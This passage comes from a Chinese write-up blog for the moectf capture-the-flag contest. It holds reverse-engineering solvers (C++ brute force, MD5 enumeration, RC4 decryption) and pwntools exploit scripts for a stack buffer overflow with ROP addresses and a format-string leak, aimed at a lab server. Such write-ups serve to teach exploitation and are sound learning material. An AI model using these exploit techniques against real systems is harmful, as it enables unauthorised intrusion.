</span></span><span style=display:flex><span>                <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> m <span style=color:#f92672>=</span> <span style=color:#ae81ff>33</span>; m <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>126</span>; m<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> temp[] <span style=color:#f92672>=</span> { (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span>)j, (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span>)k, (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span>)l, (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span>)m };
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>*</span> p <span style=color:#f92672>=</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>*</span>)temp;
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (((<span style=color:#f92672>*</span>p <span style=color:#f92672>*</span> <span style=color:#ae81ff>0xccffbbbb</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xdeadc0de</span>) <span style=color:#f92672>^</span> <span style=color:#ae81ff>0xdeadbeef</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xd3906</span>) <span style=color:#f92672>==</span> arr[i]) {
</span></span><span style=display:flex><span>                        cout <span style=color:#f92672>&lt;&lt;</span> (<span style=color:#66d9ef>char</span>)j <span style=color:#f92672>&lt;&lt;</span> (<span style=color:#66d9ef>char</span>)k <span style=color:#f92672>&lt;&lt;</span> (<span style=color:#66d9ef>char</span>)l <span style=color:#f92672>&lt;&lt;</span> (<span style=color:#66d9ef>char</span>)m;
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;  <span style=color:#75715e>// 返回-1表示没有找到匹配的字符组合
</span></span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> arr[] <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>0xb5073388</span>, <span style=color:#ae81ff>0xf58ea46f</span>, <span style=color:#ae81ff>0x8cd2d760</span>, <span style=color:#ae81ff>0x7fc56cda</span>,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>0x52bc07da</span>, <span style=color:#ae81ff>0x29054b48</span>, <span style=color:#ae81ff>0x42d74750</span>, <span style=color:#ae81ff>0x11297e95</span>,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>0x5cf2821b</span>, <span style=color:#ae81ff>0x747970da</span>, <span style=color:#ae81ff>0x64793c81</span>
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>11</span>; i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (find(i, arr) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>            cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;No match found for arr[&#34;</span> <span style=color:#f92672>&lt;&lt;</span> i <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;]</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    cout <span style=color:#f92672>&lt;&lt;</span> endl;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=secretmodule>SecretModule</h2><p>下载得到文件，打开看customize.sh，提示base64，解密后下载文件，得到以下内容</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>testk<span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>  echo <span style=color:#e6db74>&#34;Welcome to the Secret module!But before you begin,you need to prove your self.&#34;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>(</span>/system/bin/getevent -lc <span style=color:#ae81ff>1</span> 2&gt;&amp;<span style=color:#ae81ff>1</span> | /system/bin/grep VOLUME | /system/bin/grep <span style=color:#e6db74>&#34; DOWN&#34;</span> &gt; $MODPATH/events<span style=color:#f92672>)</span> <span style=color:#f92672>||</span> <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>   
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>choose<span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span> true; <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>    /system/bin/getevent -lc <span style=color:#ae81ff>1</span> 2&gt;&amp;<span style=color:#ae81ff>1</span> | /system/bin/grep VOLUME | /system/bin/grep <span style=color:#e6db74>&#34; DOWN&#34;</span> &gt; $MODPATH/events
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span><span style=color:#e6db74>`</span>cat $MODPATH/events 2&gt;/dev/null | /system/bin/grep VOLUME &gt;/dev/null<span style=color:#e6db74>`</span><span style=color:#f92672>)</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>      break
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>done</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span><span style=color:#e6db74>`</span>cat $MODPATH/events 2&gt;/dev/null | /system/bin/grep VOLUMEUP &gt;/dev/null<span style=color:#e6db74>`</span><span style=color:#f92672>)</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>    echo <span style=color:#e6db74>&#34;114514&#34;</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    echo <span style=color:#e6db74>&#34;1919810&#34;</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> testk; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>  ui_print <span style=color:#e6db74>&#34;Great! Now enter the secret.&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>  ui_print <span style=color:#e6db74>&#34;Legacy Device. Use a newer device to do this challenge&#34;</span>
</span></span><span style=display:flex><span>  exit
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>concatenated<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i in <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>2</span> <span style=color:#ae81ff>3</span> <span style=color:#ae81ff>4</span> <span style=color:#ae81ff>5</span> <span style=color:#ae81ff>6</span> <span style=color:#ae81ff>7</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>  result<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>choose<span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span>  concatenated<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>concatenated<span style=color:#e6db74>}${</span>result<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>input_str<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>echo -n $concatenated | md5sum | awk <span style=color:#e6db74>&#39;{print $1}&#39;</span><span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span>sec<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;77a58d62b2c0870132bfe8e8ea3ad7f1&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> test $input_str <span style=color:#f92672>=</span> $sec
</span></span><span style=display:flex><span><span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>	echo <span style=color:#e6db74>&#39;You are right!Flag is&#39;</span>
</span></span><span style=display:flex><span>    echo <span style=color:#e6db74>&#34;moectf{</span>$concatenated<span style=color:#e6db74>}&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    echo <span style=color:#e6db74>&#39;Wrong. Try again.&#39;</span>
</span></span><span style=display:flex><span>	exit
</span></span></code></pre></div><p>gpt帮帮我，写出解密脚本</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> itertools
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>md5_hash</span>(s):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> hashlib<span style=color:#f92672>.</span>md5(s<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 目标哈希值</span>
</span></span><span style=display:flex><span>target_hash <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;77a58d62b2c0870132bfe8e8ea3ad7f1&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 定义两个可能的结果</span>
</span></span><span style=display:flex><span>options <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;114514&#34;</span>, <span style=color:#e6db74>&#34;1919810&#34;</span>]
</span></span><span style=display:flex><span><span style=color:#75715e># 枚举所有可能的组合，7个位置，每个位置有两个可能的选择</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> combo <span style=color:#f92672>in</span> itertools<span style=color:#f92672>.</span>product(options, repeat<span style=color:#f92672>=</span><span style=color:#ae81ff>7</span>):
</span></span><span style=display:flex><span>    <span style=color:#75715e># 组合成一个字符串</span>
</span></span><span style=display:flex><span>    concatenated <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join(combo)
</span></span><span style=display:flex><span>    <span style=color:#75715e># 计算其 MD5 哈希值</span>
</span></span><span style=display:flex><span>    hashed <span style=color:#f92672>=</span> md5_hash(concatenated)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 如果哈希值匹配目标</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> hashed <span style=color:#f92672>==</span> target_hash:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;找到匹配的输入序列: </span><span style=color:#e6db74>{</span>combo<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;输入字符串: </span><span style=color:#e6db74>{</span>concatenated<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Flag 是: moectf</span><span style=color:#ae81ff>{{</span><span style=color:#e6db74>{</span>concatenated<span style=color:#e6db74>}</span><span style=color:#ae81ff>}}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span></code></pre></div><h2 id=rc4>rc4</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include&lt;stdio.h&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include&lt;string.h&gt;
</span></span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>unsigned</span> longULONG;
</span></span><span style=display:flex><span><span style=color:#75715e>/*初始化函数*/</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>rc4_init</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>s, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>key, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> Len)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>, j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> k[<span style=color:#ae81ff>256</span>] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0</span> };
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> tmp <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>256</span>; i<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        s[i] <span style=color:#f92672>=</span> i;
</span></span><span style=display:flex><span>        k[i] <span style=color:#f92672>=</span> key[i<span style=color:#f92672>%</span>Len];
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>256</span>; i<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        j <span style=color:#f92672>=</span> (j <span style=color:#f92672>+</span> s[i] <span style=color:#f92672>+</span> k[i]) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>;
</span></span><span style=display:flex><span>        tmp <span style=color:#f92672>=</span> s[i];
</span></span><span style=display:flex><span>        s[i] <span style=color:#f92672>=</span> s[j];<span style=color:#75715e>//交换s[i]和s[j]
</span></span></span><span style=display:flex><span>        s[j] <span style=color:#f92672>=</span> tmp;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>} 
</span></span><span style=display:flex><span><span style=color:#75715e>/*加解密*/</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>rc4_crypt</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>s, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>Data, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> Len)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>, j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>, t <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> k <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> tmp;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (k <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; k<span style=color:#f92672>&lt;</span>Len; k<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        i <span style=color:#f92672>=</span> (i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>;
</span></span><span style=display:flex><span>        j <span style=color:#f92672>=</span> (j <span style=color:#f92672>+</span> s[i]) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>;
</span></span><span style=display:flex><span>        tmp <span style=color:#f92672>=</span> s[i];
</span></span><span style=display:flex><span>        s[i] <span style=color:#f92672>=</span> s[j];<span style=color:#75715e>//交换s[x]和s[y]
</span></span></span><span style=display:flex><span>        s[j] <span style=color:#f92672>=</span> tmp;
</span></span><span style=display:flex><span>        t <span style=color:#f92672>=</span> (s[i] <span style=color:#f92672>+</span> s[j]) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>;
</span></span><span style=display:flex><span>        Data[k] <span style=color:#f92672>^=</span> s[t];
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> flag[]<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>     	 <span style=color:#ae81ff>0xA7</span>,<span style=color:#ae81ff>0x1A</span>,<span style=color:#ae81ff>0x68</span>,<span style=color:#ae81ff>0xEC</span>,<span style=color:#ae81ff>0xD8</span>,<span style=color:#ae81ff>0x27</span>,<span style=color:#ae81ff>0x11</span>,<span style=color:#ae81ff>0xCC</span>,<span style=color:#ae81ff>0x8C</span>,<span style=color:#ae81ff>0x9B</span>,<span style=color:#ae81ff>0x16</span>,<span style=color:#ae81ff>0x15</span>,<span style=color:#ae81ff>0x5C</span>,<span style=color:#ae81ff>0xD2</span>,<span style=color:#ae81ff>0x67</span>,<span style=color:#ae81ff>0x3E</span>,<span style=color:#ae81ff>0x82</span>,<span style=color:#ae81ff>0xAD</span>,<span style=color:#ae81ff>0xCE</span>,<span style=color:#ae81ff>0x75</span>,<span style=color:#ae81ff>0xD4</span>,
</span></span><span style=display:flex><span>		 <span style=color:#ae81ff>0xBC</span>,<span style=color:#ae81ff>0x57</span>,<span style=color:#ae81ff>0x56</span>,<span style=color:#ae81ff>0xC2</span>,<span style=color:#ae81ff>0x8A</span>,<span style=color:#ae81ff>0x52</span>,<span style=color:#ae81ff>0xB8</span>,<span style=color:#ae81ff>0x6B</span>,<span style=color:#ae81ff>0xD6</span>,<span style=color:#ae81ff>0xCC</span>,<span style=color:#ae81ff>0xF8</span>,<span style=color:#ae81ff>0xA4</span>,<span style=color:#ae81ff>0xBA</span>,<span style=color:#ae81ff>0x72</span>,<span style=color:#ae81ff>0x2F</span>,<span style=color:#ae81ff>0xE0</span>,<span style=color:#ae81ff>0x57</span>,<span style=color:#ae81ff>0x15</span>,<span style=color:#ae81ff>0xB9</span>,<span style=color:#ae81ff>0x24</span>,<span style=color:#ae81ff>0x11</span>
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> key[]<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;RC4_1s_4w3s0m3&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span>  <span style=color:#66d9ef>char</span> s[<span style=color:#ae81ff>256</span>]<span style=color:#f92672>=</span>{<span style=color:#ae81ff>0</span>};
</span></span><span style=display:flex><span>    rc4_init(s,key,<span style=color:#ae81ff>14</span>);
</span></span><span style=display:flex><span>    rc4_crypt(s,flag,<span style=color:#ae81ff>42</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> i;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span>(i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;i<span style=color:#f92672>&lt;=</span><span style=color:#ae81ff>42</span>;i<span style=color:#f92672>++</span>){
</span></span><span style=display:flex><span>		printf(<span style=color:#e6db74>&#34;%c&#34;</span>,flag[i]);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><h1 id=二进制漏洞审计>二进制漏洞审计</h1><h2 id=二进制漏洞审计入门指北>二进制漏洞审计入门指北</h2><p>nc连接一下就出来了</p><h2 id=notenoughtime>NotEnoughTime</h2><p>是个数学题，写个脚本交互一下吧</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>work</span>(io):
</span></span><span style=display:flex><span>    <span style=color:#75715e># 初始交互，发送设置值</span>
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;ones.&#34;</span>)
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;=&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;=&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;0&#39;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># 进入到数学表达式部分</span>
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;PREPARED!&#39;</span>)
</span></span><span style=display:flex><span>    a <span style=color:#f92672>=</span> io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;=&#39;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># 循环处理数学表达式</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>        <span style=color:#75715e># 清理接收到的表达式，移除空白字符并替换除法符号</span>
</span></span><span style=display:flex><span>        aa <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>sub(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;[ \t\n\r=]+&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, a<span style=color:#f92672>.</span>decode())<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;/&#39;</span>, <span style=color:#e6db74>&#39;//&#39;</span>)
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#75715e># 计算表达式的结果</span>
</span></span><span style=display:flex><span>        ans <span style=color:#f92672>=</span> eval(aa)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Calculated Answer: </span><span style=color:#e6db74>{</span>ans<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#75715e># 将计算结果发送回服务器</span>
</span></span><span style=display:flex><span>        io<span style=color:#f92672>.</span>sendline(str(ans)<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            <span style=color:#75715e># 接收下一个表达式</span>
</span></span><span style=display:flex><span>            a <span style=color:#f92672>=</span> io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;=&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>EOFError</span>:
</span></span><span style=display:flex><span>            <span style=color:#75715e># 如果没有更多表达式则跳出循环</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 连接到远程服务，端口为62593</span>
</span></span><span style=display:flex><span>io <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;192.168.114.1&#39;</span>, <span style=color:#ae81ff>63631</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 执行工作函数</span>
</span></span><span style=display:flex><span>work(io)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 保持交互</span>
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><h2 id=no_more_gets>no_more_gets</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exp</span>(io):
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;out.&#39;</span>)  <span style=color:#75715e># 接收直到指定字符串</span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>0x50</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0x40101a</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0x401176</span>)  <span style=color:#75715e># 构造 payload</span>
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendline(payload)  <span style=color:#75715e># 发送 payload</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 使用正确的 IP 地址</span>
</span></span><span style=display:flex><span>io <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;192.168.114.1&#39;</span>, <span style=color:#ae81ff>63945</span>)  <span style=color:#75715e># 建立远程连接</span>
</span></span><span style=display:flex><span>exp(io)  <span style=color:#75715e># 执行 exp 函数</span>
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>interactive()  <span style=color:#75715e># 进入交互模式</span>
</span></span></code></pre></div><h2 id=leak_sth>leak_sth</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>=</span>remote(<span style=color:#e6db74>&#34;192.168.114.1&#34;</span>,<span style=color:#ae81ff>56731</span>)
</span></span><span style=display:flex><span>payload<span style=color:#f92672>=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;%7$p&#34;</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Your name:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>0x&#34;</span>)
</span></span><span style=display:flex><span>data<span style=color:#f92672>=</span>p<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>8</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;data=&#34;</span>,data)
</span></span><span style=display:flex><span>data<span style=color:#f92672>=</span>int(data,<span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;data2=&#34;</span>,hex(data))
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(str(data))
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><h2 id=这是什么shellcode>这是什么？shellcode！</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
